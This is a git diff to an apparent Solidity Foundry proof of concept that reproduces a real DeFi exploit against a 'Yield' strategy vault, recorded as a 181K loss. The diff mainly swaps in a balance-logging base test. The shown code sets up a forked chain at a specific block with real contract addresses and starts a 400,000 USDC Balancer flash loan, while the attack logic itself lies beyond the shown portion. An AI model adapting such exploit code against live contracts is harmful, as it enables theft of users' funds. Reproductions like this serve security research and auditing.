@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
 
-import "forge-std/Test.sol";
+import "../basetest.sol";
 import "src/test/interface.sol";
 
 // @KeyInfo - Total Lost : 181K
@@ -28,7 +28,7 @@ interface IYieldStrategy is IERC20 {
     function burnDivested(address to) external returns (uint256);
 }
 
-contract Yield is Test {
+contract Yield is BaseTestWithBalanceLog {
     uint256 blocknumToForkFrom = 206_219_811;
     IYieldStrategy YieldStrategy_1 = IYieldStrategy(0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa); // pool token
     IYieldStrategy YieldStrategy_2 = IYieldStrategy(0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47); // strategy token valut
@@ -41,21 +41,16 @@ contract Yield is Test {
         vm.label(address(YieldStrategy_2), "YieldStrategy_2");
         vm.label(address(Balancer), "Balancer");
         vm.label(address(USDC), "USDC");
+        fundingToken = address(USDC);
     }
 
-    function testExploit() public {
-        // Implement exploit code here
+    function testExploit() public balanceLog {
         address[] memory tokens = new address[](1);
         tokens[0] = address(USDC);
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = 400_000 * 1e6;
         bytes memory userData = "";
         Balancer.flashLoan(address(this), tokens, amounts, userData);
-
-        // Log balances after exploit
-        emit log_named_decimal_uint(
-            " Attacker USDC Balance After exploit", USDC.balanceOf(address(this)), USDC.decimals()
-        );
     }
 
     function receiveFlashLoan(
